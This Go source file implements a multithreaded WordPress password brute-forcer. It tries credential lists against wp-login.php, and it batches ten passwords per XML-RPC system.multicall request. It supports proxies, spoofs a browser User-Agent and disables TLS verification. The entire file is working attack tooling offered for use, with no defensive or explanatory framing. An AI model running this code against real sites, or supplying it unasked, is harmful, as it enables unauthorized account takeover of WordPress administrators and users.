package engine

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type BruteMethod string

const (
	BruteMethodLogin  BruteMethod = "login"
	BruteMethodXMLRPC BruteMethod = "xmlrpc"
)

type BruteOptions struct {
	Target    string
	Usernames []string
	Passwords []string
	Method    BruteMethod
	Threads   int
	Proxy     string
	Timeout   time.Duration
	VerifyTLS bool
	UserAgent string
	Verbose   bool
}

type BruteResult struct {
	Username string
	Password string
	Success  bool
}

type BruteForcer struct {
	client  *http.Client
	logger  *Logger
	options *BruteOptions
}

func NewBruteForcer(options *BruteOptions, logger *Logger) *BruteForcer {
	transport := &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 10,
	}

	if !options.VerifyTLS {
		transport.TLSClientConfig = &tls.Config{
			InsecureSkipVerify: true,
		}
	}

	if options.Proxy != "" {
		proxyURL, err := url.Parse(options.Proxy)
		if err == nil {
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}

	timeout := options.Timeout
	if timeout == 0 {
		timeout = 10 * time.Second
	}

	client := &http.Client{
		Timeout:   timeout,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	return &BruteForcer{
		client:  client,
		logger:  logger,
		options: options,
	}
}

func (bf *BruteForcer) Run() ([]BruteResult, error) {
	target := bf.options.Target
	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		target = "https://" + target
	}
	target = strings.TrimRight(target, "/")

	switch bf.options.Method {
	case BruteMethodXMLRPC:
		return bf.runXMLRPC(target)
	default:
		return bf.runLogin(target)
	}
}

func (bf *BruteForcer) runLogin(target string) ([]BruteResult, error) {
	loginURL := target + "/wp-login.php"
	bf.logger.Info(fmt.Sprintf("Brute-force via wp-login.php: %s", loginURL))
	bf.logger.Info(fmt.Sprintf("Usernames: %d, Passwords: %d, Threads: %d",
		len(bf.options.Usernames), len(bf.options.Passwords), bf.options.Threads))

	var results []BruteResult
	var mu sync.Mutex
	var tested int64
	total := int64(len(bf.options.Usernames)) * int64(len(bf.options.Passwords))

	// Canal de tarefas
	type task struct {
		username string
		password string
	}
	tasks := make(chan task, bf.options.Threads*2)

	var wg sync.WaitGroup
	for i := 0; i < bf.options.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for t := range tasks {
				success := bf.tryLogin(loginURL, t.username, t.password)
				count := atomic.AddInt64(&tested, 1)

				if success {
					bf.logger.Info(fmt.Sprintf("[SUCCESS] %s:%s", t.username, t.password))
					mu.Lock()
					results = append(results, BruteResult{
						Username: t.username,
						Password: t.password,
						Success:  true,
					})
					mu.Unlock()
				} else if count%50 == 0 || bf.options.Verbose {
					bf.logger.Info(fmt.Sprintf("[%d/%d] Trying %s:%s", count, total, t.username, t.password))
				}
			}
		}()
	}

	for _, username := range bf.options.Usernames {
		for _, password := range bf.options.Passwords {
			tasks <- task{username: username, password: password}
		}
	}
	close(tasks)
	wg.Wait()

	return results, nil
}

func (bf *BruteForcer) tryLogin(loginURL, username, password string) bool {
	body := fmt.Sprintf("log=%s&pwd=%s&wp-submit=Log+In&redirect_to=%%2Fwp-admin%%2F&testcookie=1",
		url.QueryEscape(username), url.QueryEscape(password))

	req, err := http.NewRequest("POST", loginURL, bytes.NewBufferString(body))
	if err != nil {
		return false
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	ua := bf.options.UserAgent
	if ua == "" {
		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Cookie", "wordpress_test_cookie=WP+Cookie+check")

	resp, err := bf.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)

	if resp.StatusCode == 302 {
		location := resp.Header.Get("Location")
		if strings.Contains(location, "wp-admin") {
			return true
		}
	}

	return false
}

func (bf *BruteForcer) runXMLRPC(target string) ([]BruteResult, error) {
	xmlrpcURL := target + "/xmlrpc.php"
	bf.logger.Info(fmt.Sprintf("Brute-force via XMLRPC multicall: %s", xmlrpcURL))
	bf.logger.Info(fmt.Sprintf("Usernames: %d, Passwords: %d, Threads: %d, Batch: 10 passwords/request",
		len(bf.options.Usernames), len(bf.options.Passwords), bf.options.Threads))

	var results []BruteResult
	var mu sync.Mutex
	var tested int64
	batchSize := 10

	type task struct {
		username  string
		passwords []string
	}
	tasks := make(chan task, bf.options.Threads*2)

	var wg sync.WaitGroup
	for i := 0; i < bf.options.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for t := range tasks {
				found := bf.tryXMLRPCBatch(xmlrpcURL, t.username, t.passwords)
				count := atomic.AddInt64(&tested, int64(len(t.passwords)))

				for _, password := range found {
					bf.logger.Info(fmt.Sprintf("[SUCCESS] %s:%s", t.username, password))
					mu.Lock()
					results = append(results, BruteResult{
						Username: t.username,
						Password: password,
						Success:  true,
					})
					mu.Unlock()
				}

				if len(found) == 0 && (count%100 == 0 || bf.options.Verbose) {
					bf.logger.Info(fmt.Sprintf("[%d tested] Trying %s (batch of %d)",
						count, t.username, len(t.passwords)))
				}
			}
		}()
	}

	for _, username := range bf.options.Usernames {
		for i := 0; i < len(bf.options.Passwords); i += batchSize {
			end := i + batchSize
			if end > len(bf.options.Passwords) {
				end = len(bf.options.Passwords)
			}
			batch := make([]string, end-i)
			copy(batch, bf.options.Passwords[i:end])
			tasks <- task{username: username, passwords: batch}
		}
	}
	close(tasks)
	wg.Wait()

	return results, nil
}

// tryXMLRPCBatch tenta múltiplas senhas via system.multicall
func (bf *BruteForcer) tryXMLRPCBatch(xmlrpcURL, username string, passwords []string) []string {
	// Monta XML com multicall
	var calls strings.Builder
	calls.WriteString(`<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>`)

	for _, password := range passwords {
		calls.WriteString(`<value><struct>`)
		calls.WriteString(`<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>`)
		calls.WriteString(fmt.Sprintf(`<member><name>params</name><value><array><data><value><string>%s</string></value><value><string>%s</string></value></data></array></value></member>`,
			xmlEscape(username), xmlEscape(password)))
		calls.WriteString(`</struct></value>`)
	}

	calls.WriteString(`</data></array></value></param></params></methodCall>`)

	req, err := http.NewRequest("POST", xmlrpcURL, bytes.NewBufferString(calls.String()))
	if err != nil {
		return nil
	}

	req.Header.Set("Content-Type", "text/xml")
	ua := bf.options.UserAgent
	if ua == "" {
		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
	}
	req.Header.Set("User-Agent", ua)

	resp, err := bf.client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}
	body := string(bodyBytes)

	var found []string
	parts := strings.Split(body, "</value>\n<value>")
	if len(parts) == 1 {
		parts = strings.Split(body, "</value><value>")
	}

	responses := splitMulticallResponses(body)
	for i, respBlock := range responses {
		if i < len(passwords) {
			if strings.Contains(respBlock, "isAdmin") || strings.Contains(respBlock, "blogid") || strings.Contains(respBlock, "blogName") {
				found = append(found, passwords[i])
			}
		}
	}

	return found
}

func splitMulticallResponses(body string) []string {
	var responses []string

	dataStart := strings.Index(body, "<data>")
	dataEnd := strings.LastIndex(body, "</data>")
	if dataStart < 0 || dataEnd < 0 || dataEnd <= dataStart {
		return responses
	}

	data := body[dataStart+6 : dataEnd]

	depth := 0
	start := -1
	for i := 0; i < len(data); i++ {
		if strings.HasPrefix(data[i:], "<value>") {
			if depth == 0 {
				start = i
			}
			depth++
		}
		if strings.HasPrefix(data[i:], "</value>") {
			depth--
			if depth == 0 && start >= 0 {
				responses = append(responses, data[start:i+8])
				start = -1
			}
		}
	}

	return responses
}

func xmlEscape(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	s = strings.ReplaceAll(s, "\"", "&quot;")
	s = strings.ReplaceAll(s, "'", "&apos;")
	return s
}
